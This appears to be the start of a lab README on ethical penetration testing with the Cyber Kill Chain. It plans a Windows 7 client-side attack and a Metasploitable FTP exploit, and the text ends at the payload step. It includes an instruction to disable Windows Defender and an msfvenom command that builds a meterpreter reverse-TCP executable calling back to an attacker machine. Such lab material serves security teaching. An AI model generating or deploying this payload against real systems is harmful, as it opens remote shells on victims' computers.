## lab work revolves around ethical penetration testing using the Cyber Kill Chain model, with two main practical tracks
```
    1. Windows-based client-side attack (via payload delivery and privilege escalation)
    2. Server-side FTP vulnerability exploitation (on Metasploitable Linux)
```
## 🔧 Prerequisites
```
Make sure you have:

    VirtualBox (or VMware)
    Kali Linux (attacker machine)
    Windows 7 VM (victim client) — for Track 1
    Metasploitable Linux 2 (vulnerable server) — for Track 2
    All VMs on the same network mode (Host-only or Bridged as needed)
```

## 🛠️ TRACK 1: Windows-based client-side attack (via payload delivery)
### Step 1: Set Up Vulnerable Windows 7 VM
```
Create a new VM in VirtualBox
Install Windows 7 using an ISO.
Disable Windows Defender:
```

### Step 2: Generate Malicious Payload

**Command**: 
```
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o any_name.exe
```



